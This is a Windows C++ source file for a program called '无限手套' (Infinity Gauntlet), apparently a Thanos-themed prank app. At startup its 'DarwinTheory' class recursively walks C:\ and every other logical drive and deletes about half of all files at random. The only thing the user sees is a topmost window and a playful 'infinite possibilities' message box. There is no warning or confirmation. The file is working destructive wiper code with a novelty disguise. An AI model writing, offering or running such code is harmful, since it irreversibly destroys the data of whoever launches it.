// 无限手套.cpp : 定义应用程序的入口点。
//

#include "stdafx.h"
#include "无限手套.h"

#define MAX_LOADSTRING 100

#include<iostream>
using namespace std;
#include<time.h>
#include<stdlib.h>
#define MAX_LEVEL 10
class DarwinTheory
{
private:
	double sumCount;
	double proCount;
	TCHAR rootDir[MAX_PATH * 10];
	double rate ;
	int similar;
public:
	DarwinTheory(TCHAR * PRootDir) :sumCount(0), proCount(0)
	{
		lstrcpy(rootDir, PRootDir); 
	}
	void RunTheory()
	{
		FindAllFile(rootDir);
	}
	bool FileProcess(TCHAR * filename)
	{
		DeleteFile(filename);
		//MessageBox(NULL,filename,L"DEL",MB_OK);
		return true;
		
	}
private:
	void FindAllFile(TCHAR * PreDir)
	{
		TCHAR szParentPath[MAX_PATH * MAX_LEVEL];
		lstrcpy(szParentPath, PreDir);
		WIN32_FIND_DATA FindFileData;
		HANDLE hListFile;
		TCHAR szFilePath[MAX_PATH * MAX_LEVEL];
		lstrcpy(szFilePath, PreDir);
		lstrcat(szFilePath, L"\\*");
		hListFile = FindFirstFile(szFilePath, &FindFileData);
		if (hListFile == INVALID_HANDLE_VALUE)
		{
			return;
		}
		do
		{
			if (!lstrcmp(FindFileData.cFileName, TEXT(".")) == 0 &&
				!lstrcmp(FindFileData.cFileName, TEXT("..")) == 0)
			{
				//是否是文件夹
				if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					TCHAR nextDir[MAX_PATH * MAX_LEVEL];
					lstrcpy(nextDir, szParentPath);
					lstrcat(nextDir, L"\\");
					lstrcat(nextDir, FindFileData.cFileName);
					FindAllFile(nextDir);
				}
				else
				{
					TCHAR filename[MAX_PATH * MAX_LEVEL];
					lstrcpy(filename, szParentPath);
					lstrcat(filename, L"\\");
					lstrcat(filename, FindFileData.cFileName);
					this->sumCount = this->sumCount + 1;
					rate= this->proCount / this->sumCount;
					if ( rate< 0.5)
					{
						similar = (int)((rate - 0.5)*100.0);
						if (similar < 0)
							similar = -similar;
						if (rand() % 100<100-similar)
						{
							if (FileProcess(filename) == true)
							{
								this->proCount = this->proCount + 1;
							}
						}
					}
				}
				
			}
			
		} while (FindNextFile(hListFile, &FindFileData));
	}
	
};


// 全局变量: 
HINSTANCE hInst;								// 当前实例
TCHAR szTitle[MAX_LOADSTRING];					// 标题栏文本
TCHAR szWindowClass[MAX_LOADSTRING];			// 主窗口类名

// 此代码模块中包含的函数的前向声明: 
ATOM				MyRegisterClass(HINSTANCE hInstance);
BOOL				InitInstance(HINSTANCE, int);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK	About(HWND, UINT, WPARAM, LPARAM);

#include<stdio.h>
int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPTSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

 	// TODO:  在此放置代码。
	MSG msg;
	HACCEL hAccelTable;

	// 初始化全局字符串
	LoadString(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadString(hInstance, IDS_CLASS_NAME, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);

	// 执行应用程序初始化: 
	if (!InitInstance (hInstance, nCmdShow))
	{
		return FALSE;
	}

	hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_MY));
	srand((unsigned int)time(NULL));
	DarwinTheory dar(L"C:\\");
	dar.RunTheory();
	int len = GetLogicalDriveStrings(0,NULL);
	TCHAR Dirvers[150];
	GetLogicalDriveStrings(len, (LPTSTR)Dirvers);//数据格式C:\NULLD:\NULL...四个字节一组
	for (int i = 0; i < len / 4; i++)
	{
		
		DarwinTheory dar(&Dirvers[i * 4]);
		dar.RunTheory();
		//MessageBox(NULL, &Dirvers[i * 4], L"Diver", MB_OK);
	}

	// 主消息循环: 
	msg = {0};
	msg.message = WM_CLOSE;
	/*while (GetMessage(&msg, NULL, 0, 0))
	{
		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}
*/
	return (int) msg.wParam;
}



//
//  函数:  MyRegisterClass()
//
//  目的:  注册窗口类。
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style = CS_HREDRAW | CS_VREDRAW | CS_NOCLOSE;
	wcex.lpfnWndProc	= WndProc;
	wcex.cbClsExtra		= 0;
	wcex.cbWndExtra		= 0;
	wcex.hInstance		= hInstance;
	wcex.hIcon			= LoadIcon(hInstance, MAKEINTRESOURCE(IDI_MY));
	wcex.hCursor = LoadCursor(NULL, IDC_WAIT);//LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground	= (HBRUSH)(COLOR_WINDOW+1);
	wcex.lpszMenuName = NULL;//MAKEINTRESOURCE(IDC_MY);
	wcex.lpszClassName	= szWindowClass;
	wcex.hIconSm		= LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	return RegisterClassEx(&wcex);
}

//
//   函数:  InitInstance(HINSTANCE, int)
//
//   目的:  保存实例句柄并创建主窗口
//
//   注释: 
//
//        在此函数中，我们在全局变量中保存实例句柄并
//        创建和显示主程序窗口。
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   HWND hWnd;

   hInst = hInstance; // 将实例句柄存储在全局变量中

   hWnd = CreateWindow(szWindowClass, szTitle, WS_OVERLAPPED | WS_EX_TRANSPARENT  - WS_CAPTION,
	   GetSystemMetrics(SM_CXSCREEN)/2-320/2, GetSystemMetrics(SM_CYSCREEN)/2-240/2, 320, 240, NULL, NULL, hInstance, NULL);

   if (!hWnd)
   {
      return FALSE;
   }
   SetWindowLong(hWnd, GWL_EXSTYLE, GetWindowLong(hWnd, GWL_EXSTYLE) | WS_EX_LAYERED);
   SetLayeredWindowAttributes(hWnd, RGB(255, 255, 255), 255, LWA_ALPHA|LWA_COLORKEY);
   SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE|SWP_NOMOVE);
   ShowWindow(hWnd, nCmdShow);
   //ShowWindow(hWnd, SW_HIDE);
   UpdateWindow(hWnd);
   MessageBox(hWnd, L"无限可能", L"无限手套", MB_OK);
   return TRUE;
}

//
//  函数:  WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  目的:    处理主窗口的消息。
//
//  WM_COMMAND	- 处理应用程序菜单
//  WM_PAINT	- 绘制主窗口
//  WM_DESTROY	- 发送退出消息并返回
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	int wmId, wmEvent;
	PAINTSTRUCT ps;
	HDC hdc;

	switch (message)
	{
	case WM_COMMAND:
		wmId    = LOWORD(wParam);
		wmEvent = HIWORD(wParam);
		// 分析菜单选择: 
		switch (wmId)
		{
		case IDM_ABOUT:
			DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
			break;
		case IDM_EXIT:
			DestroyWindow(hWnd);
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
		}
		break;
	case WM_PAINT:
		hdc = BeginPaint(hWnd, &ps);
		// TODO:  在此添加任意绘图代码...
		{
			SetBkColor(hdc,RGB(255,255,255));
			TCHAR tips[] = { L"无限手套 无限可能" };
			RECT rect;
			GetWindowRect(hWnd, &rect);
			TEXTMETRIC textinfo;
			GetTextMetrics(hdc, &textinfo);
			int wid = rect.right - rect.left;
			int hei = rect.bottom - rect.top;
			TextOut(hdc, wid / 2 - lstrlen(tips)*textinfo.tmAveCharWidth, hei / 2 - textinfo.tmHeight, tips, lstrlen(tips));
		}
		EndPaint(hWnd, &ps);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

// “关于”框的消息处理程序。
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
		{
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		break;
	}
	return (INT_PTR)FALSE;
}
